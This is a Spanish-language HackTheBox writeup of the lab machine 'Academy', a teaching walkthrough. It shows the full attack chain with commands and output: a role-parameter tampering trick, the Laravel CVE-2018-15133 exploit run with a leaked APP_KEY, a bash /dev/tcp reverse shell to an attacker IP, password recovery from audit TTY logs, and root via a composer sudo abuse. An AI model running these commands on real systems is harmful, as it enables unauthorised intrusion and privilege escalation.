---
title: Academy Writeup - HackTheBox
date: 2023-08-17
categories: [Writeups, HTB]
tags: [Linux, HTB, CTF, Easy, HTTP, Laravel, Adm]
img_path: /assets/img/commons/academy/
image: academy.png
---

¡Saludos!

En este writeup, nos sumergiremos en la máquina [**Academy**](https://app.hackthebox.com/machines/Academy) de **HackTheBox**, la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la que llevaremos a cabo una **enumeración web** y detectaremos un panel de inicio de sesión vulnerable que nos permitirá registrarnos como administradores. Al acceder, encontraremos un dominio de desarrolladores que nos permitirá acceder a un registro de **Laravel**. Una búsqueda en Google revelará una vulnerabilidad que podremos explotar, lo que nos permitirá obtener acceso remoto al sistema a través de la ejecución de código. Luego, procederemos a realizar un **pivoting de usuarios** reutilizando las credenciales de la base de datos y recuperando los registros de entrada **TTY**, los cuales revelarán una contraseña. Finalmente, aprovecharemos el permiso de **sudo** en el binario **composer** para elevar nuestros privilegios.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.10.215
PING 10.10.10.215 (10.10.10.215) 56(84) bytes of data.
64 bytes from 10.10.10.215: icmp_seq=1 ttl=63 time=118 ms

--- 10.10.10.215 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 118.172/118.172/118.172/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.10.215 -oG allPorts.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 19:22 -05
Nmap scan report for 10.10.10.215
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 22,80,33060 -sVC 10.10.10.215 -oN services.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 19:25 -05
Nmap scan report for 10.10.10.215
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94%I=7%D=8/17%Time=64DEBA7D%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.19 seconds
```

El informe de `Nmap` revela que en el puerto `22` se encuentra en ejecución un servidor `OpenSSH 8.2p1`, mientras que en el puerto `80` se identifica un servidor `Apache 2.4.41` que intenta redirigir al dominio `http://academy.htb/`. Además, en el puerto `33060` se encuentra en funcionamiento un servidor `MySQL`.

### HTTP - 80

Para empezar, añadimos la entrada del dominio "`academy.htb`" en el archivo "`/etc/hosts`" para que se dirija a la dirección ip de la máquina víctima.

```bash
❯ echo '10.10.10.215\tacademy.htb' >> /etc/hosts
```

Al ingresar a "`academy.htb`" en el navegador web, nos encontramos con lo que parece ser una página de la academia de Hack The Box.

![web](web.png)

La página web presenta enlaces de "Login" y "Register". Dado que no contamos con credenciales válidas, procederemos a registrar una cuenta y luego iniciar sesión.

![login](login.png)

Después de completar el proceso de registro, la página web nos direcciona primero a una página de bienvenida y luego nos redirige a la página de inicio de sesión (`login.php`). En este punto, procedemos a iniciar sesión utilizando las credenciales que habíamos creado anteriormente.

![web2](web2.png)

La página web presenta diversos módulos de la Hack The Box Academy, sin embargo, no parece haber ninguna funcionalidad activa. Por lo tanto, procederemos a enumerar los directorios y archivos ocultos. Para esta tarea, haremos uso de la herramienta [dirsearch](https://github.com/maurosoria/dirsearch).

```bash
❯ python3 dirsearch.py -u http://academy.htb/ -i 200,301 -t 200

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 11713

Output: /opt/dirsearch/reports/http_academy.htb/__23-08-17_20-25-35.txt

Target: http://academy.htb/

[20:25:35] Starting: 
[20:26:08] 200 -    3KB - /admin.php
[20:26:46] 200 -    0B  - /config.php
[20:27:11] 301 -  311B  - /images  ->  http://academy.htb/images/
[20:27:21] 200 -    3KB - /login.php
[20:27:49] 200 -    3KB - /register.php

Task Completed
```

`dirsearch` revela varios archivos `PHP`, siendo "`admin.php`" el más destacado. Al acceder a "`/admin.php`", se presenta una página de inicio de sesión. Intentamos iniciar sesión utilizando nuestras credenciales registradas, pero lamentablemente el intento resulta fallido.

![admin](admin.png)

## Explotación

---

Vamos a intentar crear una nueva cuenta nuevamente y, al mismo tiempo, analizar la solicitud utilizando `Burp Suite` para entender cómo se procesa por detrás.

![request](request.png)

Observamos una solicitud **POST** que se envía a "`register.php`" con "`uid`" como nombre de usuario, "`password`" como contraseña y el parámetro "`roleid`", que está predefinido en `0`. Este último parámetro parece ser significativo, ya que parece indicar el rol del usuario. Por lo tanto, procedemos a modificar el valor de `0` a `1` para observar si se produce algún cambio.

```bash
uid=john&password=password&confirm=password&roleid=1
```

Ingresar en "`login.php`" utilizando nuestras nuevas credenciales no nos otorga acceso a ninguna funcionalidad adicional. Sin embargo, esta vez logramos acceder a "`/admin.php`".

![launch](launch.png)

Tras iniciar sesión, nos encontramos con un "Academy Launch Planner" en el que se menciona el subdominio "`dev-staging-01.academy.htb`". Por lo tanto, procedemos a agregar esta entrada a nuestro archivo de hosts.

```bash
10.10.10.215    academy.htb dev-staging-01.academy.htb
```

Al ingresar a "`dev-staging-01.academy.htb`", nos encontramos con lo que parece ser un error de Laravel.

![dev](dev.png)

En este punto, intentamos identificar la versión de Laravel sin embargo no tuvimos éxito.

Después de llevar a cabo varias búsquedas en Google, finalmente pudimos determinar que una versión específica de Laravel del año 2018 era vulnerable a una ejecución remota de código (`CVE-2018-15133`), y había exploits conocidos disponibles. Entre estos exploits se encuentra [exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133), el cual tiene la capacidad de ejecutar código de forma remota.

Para llevar a cabo la ejecución de este exploit, requerimos el `API_KEY`, afortunadamente lo podemos encontrar en la sección de "Environment & details".

![key](key.png)

El modo de uso del exploit es el siguiente:

```bash
usage: pwn_laravel.py [-h] [-c COMMAND] [-m {1,2,3,4}] [-i] URL API_KEY
```

Para ejecutarlo, simplemente proporcionamos la `URL` como parámetro, junto con el `API_KEY`. Usamos el parámetro `-c` para especificar el comando que deseamos ejecutar en la máquina víctima, en este caso "`id`".

```bash
❯ python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Después de haber confirmado su funcionamiento correctamente, procedemos a ponernos en escucha en el puerto 443 y luego ejecutamos el siguiente comando para establecer una reverse shell hacia nuestro equipo atacante:

```bash
❯ python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c "bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'"
```

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.215] 44452
bash: cannot set terminal process group (917): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/var/www/html/htb-academy-dev-01/public$ whoami
whoami
www-data
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

Para tener una shell más interactiva, procedemos a realizar un [Tratamiento de la TTY](https://r1vs3c.github.io/posts/tratamiento-tty/).

Ahora, en el directorio `/home`, realizamos una búsqueda recursiva de la user flag

```bash
www-data@academy:/home$ find . -name user.txt -type f 2>/dev/null
./cry0l1t3/user.txt
```

Al intentar acceder, notamos que no tenemos permisos de lectura.

```bash
www-data@academy:/home$ cat ./cry0l1t3/user.txt
cat: ./cry0l1t3/user.txt: Permission denied
www-data@academy:/home$ ls -l ./cry0l1t3/user.txt
-r--r----- 1 cry0l1t3 cry0l1t3 33 Aug 17 06:43 ./cry0l1t3/user.txt
```

## Pivoting de usuario

---

### Usuario cry0l1t3

Dado que el propietario es el usuario `cry0l1t3`, debemos buscar una forma de pivotar hacia ese usuario.

Recordamos del resultado de Nmap que hay una instancia de MySQL escuchando en el puerto 33060. Laravel usa archivos `.env` para configuraciones de bases de datos (paquete PHP phpdotenv).

La inspección de la aplicación Laravel academy revela credenciales MySQL en el archivo `.env`. La aplicación principal de Academy se encuentra en `/var/www/html/academy`.

```bash
www-data@academy:/var/www/html/academy$ cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

[...]
```

Intentar ingresar a MySQL utilizando el cliente mysql con estas credenciales resulta en un fallo. Sin embargo, podemos cambiar al usuario `cry0l1t3` con la contraseña "`mySup3rP4s5w0rd!!`" utilizando el comando `su`.

```bash
www-data@academy:/var/www/html$ su cry0l1t3
Password: 
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

Excelente, ahora podemos leer la flag.

```bash
$ bash
cry0l1t3@academy:/var/www/html$ cd
cry0l1t3@academy:~$ cat user.txt 
5e5f808076fab1e3****************
```

El comando `id` revela que este usuario es miembro del grupo `adm`. El grupo `adm` permite a los usuarios leer los registros del sistema. En Linux todos los registros se encuentran dentro de la carpeta `/var/log`. 

```bash
cry0l1t3@academy:/var/log$ find . -group adm 2>/dev/null
./auth.log.3.gz
./dmesg.1.gz
./syslog.2.gz
./kern.log.3.gz
./syslog.6.gz
./syslog.1
./kern.log
./dmesg.0
./syslog
./dmesg.2.gz
./apt/term.log.2.gz
./apt/term.log.3.gz
./apt/term.log.1.gz
./apt/term.log.4.gz
./apt/term.log
./audit
./audit/audit.log.2
./audit/audit.log
./audit/audit.log.3
./audit/audit.log.1
./syslog.4.gz

[...]
```

### Usuario mrb3n

Hay muchos registros, pero el más interesante es el de `audit`, ya que el kernel de Linux registra muchas cosas, pero por defecto no registra la entrada TTY. El registro de `audit` permite a los administradores del sistema registrar esto. Si el registro de entrada TTY está habilitado, cualquier entrada incluyendo contraseñas son almacenadas codificadas hexadecimalmente dentro de `/var/log/audit/audit.log`. Podemos decodificar estos valores manualmente o utilizar la utilidad `aureport` para consultar y recuperar registros de entrada TTY.

```bash
cry0l1t3@academy:/var/log$ aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
6. 08/12/2020 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
7. 08/12/2020 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
8. 08/12/2020 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>
9. 08/12/2020 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
10. 08/12/2020 02:33:26 98 0 ? 1 sh "exit",<nl>
11. 08/12/2020 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>
12. 08/12/2020 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>
13. 08/12/2020 02:33:36 109 0 ? 1 sh "exit",<nl>
```

El informe TTY revela que el usuario `mrb3n` inició sesión con la contraseña `mrb3n_Ac@d3my!` utilizando `su`. 

Entonces, simplemente cambiamos al usuario `cry0l1t3` con su respectiva contraseña.

```bash
cry0l1t3@academy:/var/log/audit$ su mrb3n
Password: 
$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
```

## Escalación de privilegios

---

Al ejecutar `sudo -l`, se revela que el usuario `mrb3n` tiene permiso para ejecutar el binario "`composer`" como **root**.

```bash
mrb3n@academy:/var/log/audit$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

Hay una entrada en [GTFOBins](https://gtfobins.github.io/gtfobins/composer/#sudo) para composer. Se trata de crear un archivo `composer.json` con una propiedad "scripts". 

![composer](composer.png)

Después de introducir estos comandos, logramos obtener un shell como root con éxito y podemos acceder a la flag de root.

```bash
mrb3n@academy:/var/log/audit$ TF=$(mktemp -d)
mrb3n@academy:/var/log/audit$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:/var/log/audit$ sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
# cd /root
# cat root.txt
0627e87322b0918f****************
```

!Happy Hacking¡
